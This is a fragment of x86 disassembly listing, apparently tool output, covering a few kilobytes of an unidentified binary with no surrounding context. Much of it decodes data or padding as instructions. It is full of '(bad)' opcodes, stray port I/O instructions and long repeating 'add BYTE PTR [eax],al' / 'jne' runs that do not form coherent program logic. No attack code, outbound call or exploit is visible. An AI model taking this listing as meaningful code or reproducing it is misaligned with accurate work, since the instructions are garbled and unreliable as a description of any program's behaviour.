  44369c:	out    dx,eax
  44369d:	jae    0x4436be
  44369f:	mov    DWORD PTR [edx-0x20],eax
  4436a2:	and    eax,0xc4dc4a89
  4436a7:	sub    ch,BYTE PTR [ecx+0x7c156afb]
  4436ad:	les    ebp,FWORD PTR [ebp+0x61]
  4436b0:	(bad)  
  4436b1:	clc    
  4436b2:	mov    dh,0x2
  4436b4:	test   DWORD PTR ds:0x0,edx
  4436ba:	add    ch,ah
  4436bc:	sbb    DWORD PTR [eax+eax*1],edi
  4436bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4436c0:	arpl   WORD PTR [ebx-0x2fd4908],bx
  4436c6:	inc    esp
  4436c7:	push   ecx
  4436c8:	mov    dl,0x84
  4436ca:	or     eax,0x3c19f9
  4436cf:	jbe    0x443698
  4436d1:	sti    
  4436d2:	push   ecx
  4436d3:	or     eax,0x1afff62d
  4436d8:	add    ebx,0xf3aefe0c
  4436de:	add    esp,DWORD PTR [eax+0x1954fc36]
  4436e4:	mov    edx,DWORD PTR [edx-0x1c]
  4436e7:	out    dx,al
  4436e8:	mov    esi,0x363803fb
  4436ed:	xchg   BYTE PTR [ebp-0x17],al
  4436f0:	mov    BYTE PTR [edx-0x20],cl
  4436f3:	mov    es,WORD PTR [edi]
  4436f5:	nop
  4436f6:	clc    
  4436f7:	add    al,BYTE PTR ss:[edi-0x66d72ab3]
  4436fe:	(bad)  
  4436ff:	xor    BYTE PTR [edx],bl
  443701:	(bad)  
  443702:	push   DWORD PTR [ebp+0x2]
  443705:	in     eax,0x9
  443707:	out    dx,al
  443708:	scas   al,BYTE PTR es:[edi]
  443709:	test   DWORD PTR [ebx+0x5586fdb7],0xf84288ad
  443713:	pop    esi
  443714:	mov    edi,0x895d73ef
  443719:	or     al,BYTE PTR [ebp+ecx*4+0x2ffc0]
  443720:	add    BYTE PTR [eax],al
  443722:	add    BYTE PTR [eax],al
  443724:	cmp    BYTE PTR [edx],bl
  443726:	test   BYTE PTR [ecx],dl
  443728:	jbe    0x4436d9
  44372a:	mul    DWORD PTR [ecx+0x3c19f1]
  443730:	jbe    0x4436ef
  443732:	test   DWORD PTR [ecx-0x7b5787b],0x3e641f4
  44373c:	jne    0x443740
  44373e:	test   DWORD PTR ds:0x3c1af9,edx
  443744:	jbe    0x4436f3
  443746:	div    DWORD PTR [ebx]
  443748:	outs   dx,DWORD PTR ds:[esi]
  443749:	popa   
  44374a:	cmp    eax,0xffffffb6
  44374d:	add    bh,ch
  44374f:	inc    esp
  443750:	sub    eax,0xe2eb078a
  443755:	mov    DWORD PTR [edx],ebp
  443757:	je     0x443776
  443759:	sar    bh,0x88
  44375c:	pop    eax
  44375d:	xchg   edx,eax
  44375e:	test   DWORD PTR [ebx+0x75],0x4089c6cf
  443765:	stos   BYTE PTR es:[edi],al
  443766:	test   DWORD PTR [ebx+0x75],0x5889c6cf
  44376d:	xchg   esi,eax
  44376e:	test   DWORD PTR [ebx+0x75],0xeaf7492a
  443775:	adc    ecx,DWORD PTR [edx+0x3c0be20d]
  44377b:	add    ah,ch
  44377d:	(bad)
  443780:	jne    0x443781
  443782:	aas    
  443783:	add    ah,dh
  443785:	sub    edi,edi
  443787:	add    al,BYTE PTR [eax]
  443789:	add    BYTE PTR [eax],al
  44378b:	add    BYTE PTR [eax],al
  44378d:	jne    0x443791
  44378f:	test   DWORD PTR [ebp-0x43],edx
  443792:	out    0xce,eax
  443794:	mov    DWORD PTR [eax+0x7543f79a],ecx
  44379a:	popa   
  44379b:	ja     0x443795
  44379d:	add    dl,BYTE PTR ss:[eax-0x18]
  4437a1:	jno    0x4437bb
  4437a3:	clc    
  4437a4:	push   esi
  4437a6:	add    ecx,DWORD PTR ds:[ebx+0x43f77e78]
  4437ad:	jne    0x443760
  4437af:	out    0xd5,eax
  4437b1:	jg     0x4437c6
  4437b3:	clc    
  4437b4:	test   DWORD PTR ds:0x3533038d,esi
  4437ba:	daa    
  4437bb:	and    eax,0xf78e988b
  4437c0:	inc    ebx
  4437c1:	jne    0x443842
  4437c3:	ret    
  4437c4:	add    al,0xf6
  4437c6:	aam    0x87
  4437c8:	clc    
  4437c9:	mov    dh,0x2
  4437cb:	add    BYTE PTR [esp+ebp*2+0x61],dh
  4437cf:	arpl   ax,di
  4437d1:	mov    dh,0x2
  4437d3:	xchg   DWORD PTR [ecx+ebx*2-0x2],eax
  4437d7:	out    0x5d,eax
  4437d9:	sub    BYTE PTR [ebx],dl
  4437db:	clc    
  4437dc:	mov    ecx,DWORD PTR [eax+0x7543f75e]
  4437e2:	mov    al,0xbc
  4437e4:	xor    esi,DWORD PTR ds:0x365de287
  4437ea:	inc    esi
  4437eb:	retf   
  4437ec:	int3   
  4437ed:	jne    0x4437f1
  4437ef:	add    BYTE PTR [eax],al
  4437f1:	add    BYTE PTR [eax],al
  4437f3:	add    BYTE PTR [eax],al
  4437f5:	add    BYTE PTR [ebp+0x2],dh
  4437f8:	add    BYTE PTR [eax],al
  4437fa:	jne    0x4437fe
  4437fc:	add    BYTE PTR [eax],al
  4437fe:	jne    0x443802
  443800:	add    BYTE PTR [eax],al
  443802:	jne    0x443806
  443804:	add    BYTE PTR [eax],al
  443806:	jne    0x44380a
  443808:	add    BYTE PTR [eax],al
  44380a:	jne    0x44380e
  44380c:	add    BYTE PTR [eax],al
  44380e:	jne    0x443812
  443810:	add    BYTE PTR [eax],al
  443812:	jne    0x443816
  443814:	add    BYTE PTR [eax],al
  443816:	jne    0x44381a
  443818:	add    BYTE PTR [eax],al
  44381a:	jne    0x44381e
  44381c:	add    BYTE PTR [eax],al
  44381e:	jne    0x443822
  443820:	add    BYTE PTR [eax],al
  443822:	jne    0x443826
  443824:	add    BYTE PTR [eax],al
  443826:	jne    0x44382a
  443828:	add    BYTE PTR [eax],al
  44382a:	jne    0x44382e
  44382c:	add    BYTE PTR [eax],al
  44382e:	jne    0x443832
  443830:	add    BYTE PTR [eax],al
  443832:	jne    0x443836
  443834:	add    BYTE PTR [eax],al
  443836:	jne    0x44383a
  443838:	add    BYTE PTR [eax],al
  44383a:	jne    0x44383e
  44383c:	add    BYTE PTR [eax],al
  44383e:	jne    0x443842
  443840:	add    BYTE PTR [eax],al
  443842:	jne    0x443846
  443844:	add    BYTE PTR [eax],al
  443846:	jne    0x44384a
  443848:	add    BYTE PTR [eax],al
  44384a:	jne    0x44384e
  44384c:	add    BYTE PTR [eax],al
  44384e:	jne    0x443852
  443850:	add    BYTE PTR [eax],al
  443852:	jne    0x443856
  443854:	add    BYTE PTR [eax],al
  443856:	jne    0x44385a
  443858:	add    BYTE PTR [eax],al
  44385a:	add    BYTE PTR [eax],al
  44385c:	add    BYTE PTR [eax],al
  44385e:	add    BYTE PTR [ebp+0x2],dh
  443861:	add    BYTE PTR [eax],al
  443863:	jne    0x443867
  443865:	add    BYTE PTR [eax],al
  443867:	jne    0x44386b
  443869:	add    BYTE PTR [eax],al
  44386b:	jne    0x44386f
  44386d:	add    BYTE PTR [eax],al
  44386f:	jne    0x443873
  443871:	add    BYTE PTR [eax],al
  443873:	jne    0x443877
  443875:	add    BYTE PTR [eax],al
  443877:	jne    0x44387b
  443879:	add    BYTE PTR [eax],al
  44387b:	jne    0x44387f
  44387d:	add    BYTE PTR [eax],al
  44387f:	jne    0x443883
  443881:	add    BYTE PTR [eax],al
  443883:	jne    0x443887
  443885:	add    BYTE PTR [eax],al
  443887:	jne    0x44388b
  443889:	add    BYTE PTR [eax],al
  44388b:	jne    0x44388f
  44388d:	add    BYTE PTR [eax],al
  44388f:	jne    0x443893
  443891:	add    BYTE PTR [eax],al
  443893:	jne    0x443897
  443895:	add    BYTE PTR [eax],al
  443897:	jne    0x44389b
  443899:	add    BYTE PTR [eax],al
  44389b:	jne    0x44389f
  44389d:	add    BYTE PTR [eax],al
  44389f:	jne    0x4438a3
  4438a1:	add    BYTE PTR [eax],al
  4438a3:	jne    0x4438a7
  4438a5:	add    BYTE PTR [eax],al
  4438a7:	jne    0x4438ab
  4438a9:	add    BYTE PTR [eax],al
  4438ab:	jne    0x4438af
  4438ad:	add    BYTE PTR [eax],al
  4438af:	jne    0x4438b3
  4438b1:	add    BYTE PTR [eax],al
  4438b3:	add    BYTE PTR [eax+eax*1],al
  4438b6:	add    BYTE PTR [ebp+0x2],dh
  4438b9:	add    BYTE PTR [eax],al
  4438bb:	pop    ebp
  4438bc:	add    al,BYTE PTR [eax]
  4438be:	add    cl,ch
  4438c0:	xor    DWORD PTR [eax-0x67cef6cd],edx
  4438c6:	xor    ecx,DWORD PTR [ecx]
  4438c8:	xor    DWORD PTR [eax-0x57cee6cd],esp
  4438ce:	xor    esi,DWORD PTR [ebp-0x1e]
  4438d1:	add    eax,DWORD PTR [eax]
  4438d3:	popf   
  4438d4:	add    al,BYTE PTR [eax]
  4438d6:	add    dh,al
  4438d8:	aas    
  4438d9:	fstp   TBYTE PTR ds:0x3dea3f55
  4438df:	dec    edx
  4438e0:	aas    
  4438e1:	clc    
  4438e2:	cmp    eax,0x3e233f33
  4438e7:	pop    ebx
  4438e8:	cmp    al,0x38
  4438ea:	ds leave 
  4438ec:	cmp    al,0x7d
  4438ee:	ds (bad) 
  4438f0:	cmp    esp,DWORD PTR [ecx+0x2d3bdc3e]
  4438f6:	aas    
  4438f7:	jne    0x4438eb
  4438f9:	add    eax,DWORD PTR [eax]
  4438fb:	and    DWORD PTR [edx],eax
  4438fd:	add    BYTE PTR [eax],al
  4438ff:	inc    ecx
  443900:	xor    dl,BYTE PTR [edi]
  443902:	xor    DWORD PTR [eax+0x41312533],edx
  443908:	xor    ebx,DWORD PTR [ebp+0x31]
  44390b:	push   0x33
  44390d:	push   cs
  44390e:	xor    al,BYTE PTR [esi-0x73cdd4d0]
  443914:	xor    BYTE PTR [edi],bh
  443916:	xor    bh,BYTE PTR [edx]
  443918:	xor    BYTE PTR [edx+esi*1+0x0],bl
  44391c:	add    BYTE PTR [eax],al
  44391e:	add    BYTE PTR [eax],al
  443920:	push   edi
  443921:	xor    BYTE PTR [esi+0x32],dh
  443924:	hlt    
  443925:	das    
  443926:	mov    DWORD PTR [edx],esi
  443928:	add    dh,BYTE PTR [eax]
  44392a:	xchg   ebp,eax
  44392b:	xor    bl,ch
  44392d:	das    
  44392e:	adc    DWORD PTR [ebx],esi
  443930:	mov    dh,BYTE PTR [ecx]
  443932:	(bad)  
  443933:	xor    edi,DWORD PTR [esi-0x74cc12d0]
  443939:	xor    BYTE PTR [eax],al
  44393b:	xor    al,0x68
  44393d:	ss xor al,0x34
  443940:	aas    
  443941:	ss push edx
  443943:	xor    al,0x0
  443945:	mov    eax,ss:0xaf371c34
  44394b:	xor    al,0x23
  44394d:	aaa    
  44394e:	int3   
  44394f:	xor    al,0x48
  443951:	aaa    
  443952:	(bad)  [esi+edx*2]
  443955:	aaa    
  443956:	jmp    0x7a34:0xff374434
  44395d:	xor    eax,0x359a3515
  443962:	xor    DWORD PTR ds:0x3549357e,esi
  443968:	(bad)  
  443969:	xor    eax,0x360d3561
  44396e:	sahf   
  44396f:	xor    eax,0x35b535d9
  443974:	fbstp  TBYTE PTR ds:0x348335d2
  44397a:	sbb    BYTE PTR [esi],dh
  44397c:	push   eax
  44397d:	xor    al,0x31
  44397f:	ss ds xor al,0x44
  443983:	add    BYTE PTR ss:[eax],al
  443986:	add    BYTE PTR [eax],al
  443988:	add    BYTE PTR [ebx+0x53365934],ch
  44398e:	xor    al,0x64
  443990:	ss pop eax
  443992:	xor    al,0x7f
  443994:	ss stc 
  443996:	xor    al,0x8a
  443998:	ss jmp 0x9e34:0xec369534
  4439a0:	adc    DWORD PTR ss:0x34fd36b2,esi
  4439a7:	mov    ebp,0xdf34b736
  4439ac:	ss lahf 
  4439ae:	xor    al,0x16
  4439b0:	aaa    
  4439b1:	mov    DWORD PTR [ebx],esi
  4439b3:	and    dh,BYTE PTR [edi]
  4439b5:	push   ecx
  4439b6:	xor    edx,DWORD PTR [esi+0x37]
  4439b9:	push   ds
  4439ba:	xor    ecx,DWORD PTR [eax-0x59cc0ec9]
  4439c0:	aaa    
  4439c1:	(bad)  
  4439c2:	xor    edi,DWORD PTR [ecx-0x36cc4bc9]
  4439c8:	aaa    
  4439c9:	mov    eax,ds:0x6037dc33
  4439ce:	xor    esi,edx
  4439d0:	aaa    
  4439d1:	je     0x443a0d
  4439d3:	adc    eax,0x263a8338
  4439d8:	cmp    BYTE PTR [eax+0x7500003a],ah
  4439de:	add    al,BYTE PTR [eax]
  4439e0:	add    BYTE PTR [ebp+0x2],dh
  4439e3:	add    BYTE PTR [eax],al
  4439e5:	jne    0x4439e9
  4439e7:	add    BYTE PTR [eax],al
  4439e9:	jne    0x4439ed
  4439eb:	add    BYTE PTR [eax],al
  4439ed:	add    BYTE PTR [eax],al
  4439ef:	add    BYTE PTR [eax],al
  4439f1:	add    BYTE PTR [ebp+0x2],dh
  4439f4:	add    BYTE PTR [eax],al
  4439f6:	jne    0x4439fa
  4439f8:	add    BYTE PTR [eax],al
  4439fa:	jne    0x4439fe
  4439fc:	add    BYTE PTR [eax],al
  4439fe:	jne    0x443a02
  443a00:	add    BYTE PTR [eax],al
  443a02:	jne    0x443a06
  443a04:	add    BYTE PTR [eax],al
  443a06:	jne    0x443a0a
  443a08:	add    BYTE PTR [eax],al
  443a0a:	jne    0x443a0e
  443a0c:	add    BYTE PTR [eax],al
  443a0e:	jne    0x443a12
  443a10:	add    BYTE PTR [eax],al
  443a12:	jne    0x443a16
  443a14:	add    BYTE PTR [eax],al
  443a16:	jne    0x443a1a
  443a18:	add    BYTE PTR [eax],al
  443a1a:	jne    0x443a1e
  443a1c:	add    BYTE PTR [eax],al
  443a1e:	jne    0x443a22
  443a20:	add    BYTE PTR [eax],al
  443a22:	jne    0x443a26
  443a24:	add    BYTE PTR [eax],al
  443a26:	jne    0x443a2a
  443a28:	add    BYTE PTR [eax],al
  443a2a:	jne    0x443a2e
  443a2c:	add    BYTE PTR [eax],al
  443a2e:	jne    0x443a32
  443a30:	add    BYTE PTR [eax],al
  443a32:	jne    0x443a36
  443a34:	add    BYTE PTR [eax],al
  443a36:	jne    0x443a3a
  443a38:	add    BYTE PTR [eax],al
  443a3a:	jne    0x443a3e
  443a3c:	add    BYTE PTR [eax],al
  443a3e:	jne    0x443a42
  443a40:	add    BYTE PTR [eax],al
  443a42:	jne    0x443a46
  443a44:	add    BYTE PTR [eax],al
  443a46:	jne    0x443a4a
  443a48:	add    BYTE PTR [eax],al
  443a4a:	jne    0x443a4e
  443a4c:	add    BYTE PTR [eax],al
  443a4e:	jne    0x443a52
  443a50:	add    BYTE PTR [eax],al
  443a52:	jne    0x443a56
  443a54:	add    BYTE PTR [eax],al
  443a56:	add    BYTE PTR [eax],al
  443a58:	add    BYTE PTR [eax],al
  443a5a:	add    BYTE PTR [ebp+0x2],dh
  443a5d:	add    BYTE PTR [eax],al
  443a5f:	jne    0x443a63
  443a61:	add    BYTE PTR [eax],al
  443a63:	jne    0x443a67
  443a65:	add    BYTE PTR [eax],al
  443a67:	jne    0x443a6b
  443a69:	add    BYTE PTR [eax],al
  443a6b:	jne    0x443a6f
  443a6d:	add    BYTE PTR [eax],al
  443a6f:	jne    0x443a73
  443a71:	add    BYTE PTR [eax],al
  443a73:	jne    0x443a77
  443a75:	add    BYTE PTR [eax],al
  443a77:	jne    0x443a7b
  443a79:	add    BYTE PTR [eax],al
  443a7b:	jne    0x443a7f
  443a7d:	add    BYTE PTR [eax],al
  443a7f:	jne    0x443a83
  443a81:	add    BYTE PTR [eax],al
  443a83:	jne    0x443a87
  443a85:	add    BYTE PTR [eax],al
  443a87:	jne    0x443a8b
  443a89:	add    BYTE PTR [eax],al
  443a8b:	jne    0x443a8f
  443a8d:	add    BYTE PTR [eax],al
  443a8f:	jne    0x443a93
  443a91:	add    BYTE PTR [eax],al
  443a93:	jne    0x443a97
  443a95:	add    BYTE PTR [eax],al
  443a97:	jne    0x443a9b
  443a99:	add    BYTE PTR [eax],al
  443a9b:	jne    0x443a9f
  443a9d:	add    BYTE PTR [eax],al
  443a9f:	jne    0x443aa3
  443aa1:	add    BYTE PTR [eax],al
  443aa3:	jne    0x443aa7
  443aa5:	add    BYTE PTR [eax],al
  443aa7:	jne    0x443aab
  443aa9:	add    BYTE PTR [eax],al
  443aab:	jne    0x443aaf
  443aad:	add    BYTE PTR [eax],al
  443aaf:	jne    0x443ab3
  443ab1:	add    BYTE PTR [eax],al
  443ab3:	jne    0x443ab7
  443ab5:	add    BYTE PTR [eax],al
  443ab7:	jne    0x443abb
  443ab9:	add    BYTE PTR [eax],al
  443abb:	jne    0x443abf
  443abd:	add    BYTE PTR [eax],al
  443abf:	add    BYTE PTR [eax],al
  443ac1:	add    BYTE PTR [eax],al
  443ac3:	add    BYTE PTR [ebp+0x2],dh
  443ac6:	add    BYTE PTR [eax],al
  443ac8:	jne    0x443acc
  443aca:	add    BYTE PTR [eax],al
  443acc:	jne    0x443ad0
  443ace:	add    BYTE PTR [eax],al
  443ad0:	jne    0x443ad4
  443ad2:	add    BYTE PTR [eax],al
  443ad4:	jne    0x443ad8
  443ad6:	add    BYTE PTR [eax],al
  443ad8:	jne    0x443adc
  443ada:	add    BYTE PTR [eax],al
  443adc:	jne    0x443ae0
  443ade:	add    BYTE PTR [eax],al
  443ae0:	jne    0x443ae4
  443ae2:	add    BYTE PTR [eax],al
  443ae4:	jne    0x443ae8
  443ae6:	add    BYTE PTR [eax],al
  443ae8:	jne    0x443aec
  443aea:	add    BYTE PTR [eax],al
  443aec:	jne    0x443af0
  443aee:	add    BYTE PTR [eax],al
  443af0:	jne    0x443af4
  443af2:	add    BYTE PTR [eax],al
  443af4:	jne    0x443af8
  443af6:	add    BYTE PTR [eax],al
  443af8:	jne    0x443afc
  443afa:	add    BYTE PTR [eax],al
  443afc:	jne    0x443b00
  443afe:	add    BYTE PTR [eax],al
  443b00:	jne    0x443b04
  443b02:	add    BYTE PTR [eax],al
  443b04:	jne    0x443b08
  443b06:	add    BYTE PTR [eax],al
  443b08:	jne    0x443b0c
  443b0a:	add    BYTE PTR [eax],al
  443b0c:	jne    0x443b10
  443b0e:	add    BYTE PTR [eax],al
  443b10:	jne    0x443b14
  443b12:	add    BYTE PTR [eax],al
  443b14:	jne    0x443b18
  443b16:	add    BYTE PTR [eax],al
  443b18:	jne    0x443b1c
  443b1a:	add    BYTE PTR [eax],al
  443b1c:	jne    0x443b20
  443b1e:	add    BYTE PTR [eax],al
  443b20:	jne    0x443b24
  443b22:	add    BYTE PTR [eax],al
  443b24:	jne    0x443b28
  443b26:	add    BYTE PTR [eax],al
  443b28:	add    BYTE PTR [eax],al
  443b2a:	add    BYTE PTR [eax],al
  443b2c:	add    BYTE PTR [ebp+0x2],dh
  443b2f:	add    BYTE PTR [eax],al
  443b31:	jne    0x443b35
  443b33:	add    BYTE PTR [eax],al
  443b35:	jne    0x443b39
  443b37:	add    BYTE PTR [eax],al
  443b39:	jne    0x443b3d
  443b3b:	add    BYTE PTR [eax],al
  443b3d:	jne    0x443b41
  443b3f:	add    BYTE PTR [eax],al
  443b41:	jne    0x443b45
  443b43:	add    BYTE PTR [eax],al
  443b45:	jne    0x443b49
  443b47:	add    BYTE PTR [eax],al
  443b49:	jne    0x443b4d
  443b4b:	add    BYTE PTR [eax],al
  443b4d:	jne    0x443b51
  443b4f:	add    BYTE PTR [eax],al
  443b51:	jne    0x443b55
  443b53:	add    BYTE PTR [eax],al
  443b55:	jne    0x443b59
  443b57:	add    BYTE PTR [eax],al
  443b59:	jne    0x443b5d
  443b5b:	add    BYTE PTR [eax],al
  443b5d:	jne    0x443b61
  443b5f:	add    BYTE PTR [eax],al
  443b61:	jne    0x443b65
  443b63:	add    BYTE PTR [eax],al
  443b65:	jne    0x443b69
  443b67:	add    BYTE PTR [eax],al
  443b69:	jne    0x443b6d
  443b6b:	add    BYTE PTR [eax],al
  443b6d:	jne    0x443b71
  443b6f:	add    BYTE PTR [eax],al
  443b71:	jne    0x443b75
  443b73:	add    BYTE PTR [eax],al
  443b75:	jne    0x443b79
  443b77:	add    BYTE PTR [eax],al
  443b79:	jne    0x443b7d
  443b7b:	add    BYTE PTR [eax],al
  443b7d:	jne    0x443b81
  443b7f:	add    BYTE PTR [eax],al
  443b81:	jne    0x443b85
  443b83:	add    BYTE PTR [eax],al
  443b85:	jne    0x443b89
  443b87:	add    BYTE PTR [eax],al
  443b89:	jne    0x443b8d
  443b8b:	add    BYTE PTR [eax],al
  443b8d:	jne    0x443b91
  443b8f:	add    BYTE PTR [eax],al
  443b91:	add    BYTE PTR [eax],al
  443b93:	add    BYTE PTR [eax],al
  443b95:	add    BYTE PTR [ebp+0x2],dh
  443b98:	add    BYTE PTR [eax],al
  443b9a:	jne    0x443b9e
  443b9c:	add    BYTE PTR [eax],al
  443b9e:	jne    0x443ba2
  443ba0:	add    BYTE PTR [eax],al
  443ba2:	jne    0x443ba6
  443ba4:	add    BYTE PTR [eax],al
  443ba6:	jne    0x443baa
  443ba8:	add    BYTE PTR [eax],al
  443baa:	jne    0x443bae
  443bac:	add    BYTE PTR [eax],al
  443bae:	jne    0x443bb2
  443bb0:	add    BYTE PTR [eax],al
  443bb2:	jne    0x443bb6
  443bb4:	add    BYTE PTR [eax],al
  443bb6:	jne    0x443bba
  443bb8:	add    BYTE PTR [eax],al
  443bba:	jne    0x443bbe
  443bbc:	add    BYTE PTR [eax],al
  443bbe:	jne    0x443bc2
  443bc0:	add    BYTE PTR [eax],al
  443bc2:	jne    0x443bc6
  443bc4:	add    BYTE PTR [eax],al
  443bc6:	jne    0x443bca
  443bc8:	add    BYTE PTR [eax],al
  443bca:	jne    0x443bce
  443bcc:	add    BYTE PTR [eax],al
  443bce:	jne    0x443bd2
  443bd0:	add    BYTE PTR [eax],al
  443bd2:	jne    0x443bd6
  443bd4:	add    BYTE PTR [eax],al
  443bd6:	jne    0x443bda
  443bd8:	add    BYTE PTR [eax],al
  443bda:	jne    0x443bde
  443bdc:	add    BYTE PTR [eax],al
  443bde:	jne    0x443be2
  443be0:	add    BYTE PTR [eax],al
  443be2:	jne    0x443be6
  443be4:	add    BYTE PTR [eax],al
  443be6:	jne    0x443bea
  443be8:	add    BYTE PTR [eax],al
  443bea:	jne    0x443bee
  443bec:	add    BYTE PTR [eax],al
  443bee:	jne    0x443bf2
  443bf0:	add    BYTE PTR [eax],al
  443bf2:	jne    0x443bf6
  443bf4:	add    BYTE PTR [eax],al
  443bf6:	jne    0x443bfa
  443bf8:	add    BYTE PTR [eax],al
  443bfa:	add    BYTE PTR [eax],al
  443bfc:	add    BYTE PTR [eax],al
  443bfe:	add    BYTE PTR [ebp+0x2],dh
  443c01:	add    BYTE PTR [eax],al
  443c03:	jne    0x443c07
  443c05:	add    BYTE PTR [eax],al
  443c07:	jne    0x443c0b
  443c09:	add    BYTE PTR [eax],al
  443c0b:	jne    0x443c0f
  443c0d:	add    BYTE PTR [eax],al
  443c0f:	jne    0x443c13
  443c11:	add    BYTE PTR [eax],al
  443c13:	jne    0x443c17
  443c15:	add    BYTE PTR [eax],al
  443c17:	jne    0x443c1b
  443c19:	add    BYTE PTR [eax],al
  443c1b:	jne    0x443c1f
  443c1d:	add    BYTE PTR [eax],al
  443c1f:	jne    0x443c23
  443c21:	add    BYTE PTR [eax],al
  443c23:	jne    0x443c27
  443c25:	add    BYTE PTR [eax],al
  443c27:	jne    0x443c2b
  443c29:	add    BYTE PTR [eax],al
  443c2b:	jne    0x443c2f
  443c2d:	add    BYTE PTR [eax],al
  443c2f:	jne    0x443c33
  443c31:	add    BYTE PTR [eax],al
  443c33:	jne    0x443c37
  443c35:	add    BYTE PTR [eax],al
  443c37:	jne    0x443c3b
  443c39:	add    BYTE PTR [eax],al
  443c3b:	jne    0x443c3f
  443c3d:	add    BYTE PTR [eax],al
  443c3f:	jne    0x443c43
  443c41:	add    BYTE PTR [eax],al
  443c43:	jne    0x443c47
  443c45:	add    BYTE PTR [eax],al
  443c47:	jne    0x443c4b
  443c49:	add    BYTE PTR [eax],al
  443c4b:	jne    0x443c4f
  443c4d:	add    BYTE PTR [eax],al
  443c4f:	jne    0x443c53
  443c51:	add    BYTE PTR [eax],al
  443c53:	jne    0x443c57
  443c55:	add    BYTE PTR [eax],al
  443c57:	jne    0x443c5b
  443c59:	add    BYTE PTR [eax],al
  443c5b:	jne    0x443c5f
  443c5d:	add    BYTE PTR [eax],al
  443c5f:	jne    0x443c63
  443c61:	add    BYTE PTR [eax],al
  443c63:	add    BYTE PTR [eax],al
  443c65:	add    BYTE PTR [eax],al
  443c67:	add    BYTE PTR [ebp+0x2],dh
  443c6a:	add    BYTE PTR [eax],al
  443c6c:	jne    0x443c70
  443c6e:	add    BYTE PTR [eax],al
  443c70:	jne    0x443c74
  443c72:	add    BYTE PTR [eax],al
  443c74:	jne    0x443c78
  443c76:	add    BYTE PTR [eax],al
  443c78:	jne    0x443c7c
  443c7a:	add    BYTE PTR [eax],al
  443c7c:	jne    0x443c80
  443c7e:	add    BYTE PTR [eax],al
  443c80:	jne    0x443c84
  443c82:	add    BYTE PTR [eax],al
  443c84:	jne    0x443c88
  443c86:	add    BYTE PTR [eax],al
  443c88:	jne    0x443c8c
  443c8a:	add    BYTE PTR [eax],al
  443c8c:	jne    0x443c90
  443c8e:	add    BYTE PTR [eax],al
  443c90:	jne    0x443c94
  443c92:	add    BYTE PTR [eax],al
  443c94:	jne    0x443c98
  443c96:	add    BYTE PTR [eax],al
  443c98:	jne    0x443c9c
  443c9a:	add    BYTE PTR [eax],al
  443c9c:	jne    0x443ca0
  443c9e:	add    BYTE PTR [eax],al
  443ca0:	jne    0x443ca4
  443ca2:	add    BYTE PTR [eax],al
  443ca4:	jne    0x443ca8
  443ca6:	add    BYTE PTR [eax],al
  443ca8:	jne    0x443cac
  443caa:	add    BYTE PTR [eax],al
  443cac:	jne    0x443cb0
  443cae:	add    BYTE PTR [eax],al
  443cb0:	jne    0x443cb4
  443cb2:	add    BYTE PTR [eax],al
  443cb4:	jne    0x443cb8
  443cb6:	add    BYTE PTR [eax],al
  443cb8:	jne    0x443cbc
  443cba:	add    BYTE PTR [eax],al
  443cbc:	jne    0x443cc0
  443cbe:	add    BYTE PTR [eax],al
  443cc0:	jne    0x443cc4
  443cc2:	add    BYTE PTR [eax],al
  443cc4:	jne    0x443cc8
  443cc6:	add    BYTE PTR [eax],al
  443cc8:	jne    0x443ccc
  443cca:	add    BYTE PTR [eax],al
  443ccc:	add    BYTE PTR [eax],al
  443cce:	add    BYTE PTR [eax],al
  443cd0:	add    BYTE PTR [ebp+0x2],dh
  443cd3:	add    BYTE PTR [eax],al
  443cd5:	jne    0x443cd9
  443cd7:	add    BYTE PTR [eax],al
  443cd9:	jne    0x443cdd
  443cdb:	add    BYTE PTR [eax],al
  443cdd:	jne    0x443ce1
  443cdf:	add    BYTE PTR [eax],al
  443ce1:	jne    0x443ce5
  443ce3:	add    BYTE PTR [eax],al
  443ce5:	jne    0x443ce9
  443ce7:	add    BYTE PTR [eax],al
  443ce9:	jo     0x443d55
  443ceb:	inc    esp
  443cec:	add    BYTE PTR [edx+ebp*2+0x44],dh
  443cf0:	add    BYTE PTR [eax+0x6a],bh
  443cf3:	inc    esp
  443cf4:	add    BYTE PTR [edx+ebp*2+0x44],bh
  443cf8:	add    BYTE PTR [eax-0x7bffbb96],al
  443cfe:	push   0x44
  443d00:	add    BYTE PTR [eax-0x73ffbb96],cl
  443d06:	push   0x44
  443d08:	add    BYTE PTR [eax-0x6bffbb96],dl
  443d0e:	push   0x44
  443d10:	add    BYTE PTR [eax-0x63ffbb96],bl
  443d16:	push   0x44
  443d18:	add    BYTE PTR [eax-0x5bffbb96],ah
  443d1e:	push   0x44
  443d20:	add    BYTE PTR [eax-0x53ffbb96],ch
  443d26:	push   0x44
  443d28:	add    BYTE PTR [eax-0x4bffbb96],dh
  443d2e:	push   0x44
  443d30:	add    BYTE PTR [eax-0x43ffbb96],bh
  443d36:	push   0x44
  443d38:	add    al,al
  443d3a:	push   0x44
  443d3c:	add    ah,al
  443d3e:	push   0x44
  443d40:	add    al,cl
  443d42:	push   0x44
  443d44:	add    ah,cl
  443d46:	push   0x44
  443d48:	add    al,dl
  443d4a:	push   0x44
  443d4c:	add    ah,dl
  443d4e:	push   0x44
  443d50:	add    al,bl
  443d52:	push   0x44
  443d54:	add    ah,bl
  443d56:	push   0x44
  443d58:	add    al,ah
  443d5a:	push   0x44
  443d5c:	add    ah,ah
  443d5e:	push   0x44
  443d60:	add    al,ch
  443d62:	push   0x44
  443d64:	add    ah,ch
  443d66:	push   0x44
  443d68:	add    al,dh
  443d6a:	push   0x44
  443d6c:	add    ah,dh
  443d6e:	push   0x44
  443d70:	add    al,bh
  443d72:	push   0x44
  443d74:	add    ah,bh
  443d76:	push   0x44
  443d78:	add    BYTE PTR [eax],al
  443d7a:	imul   eax,DWORD PTR [eax+eax*1+0x4],0x6b
  443d7f:	inc    esp
  443d80:	add    BYTE PTR [eax],cl
  443d82:	imul   eax,DWORD PTR [eax+eax*1+0x70],0x6a
  443d87:	inc    esp
  443d88:	add    BYTE PTR [ebx+ebp*2],cl
  443d8b:	inc    esp
  443d8c:	add    BYTE PTR [eax],dl
  443d8e:	imul   eax,DWORD PTR [eax+eax*1+0x14],0x6b
  443d93:	inc    esp
  443d94:	add    BYTE PTR [eax],bl
  443d96:	imul   eax,DWORD PTR [eax+eax*1+0x1c],0x6b
  443d9b:	inc    esp
  443d9c:	add    BYTE PTR [eax],ah
  443d9e:	imul   eax,DWORD PTR [eax+eax*1+0x24],0x6b
  443da3:	inc    esp
  443da4:	add    BYTE PTR [eax],ch
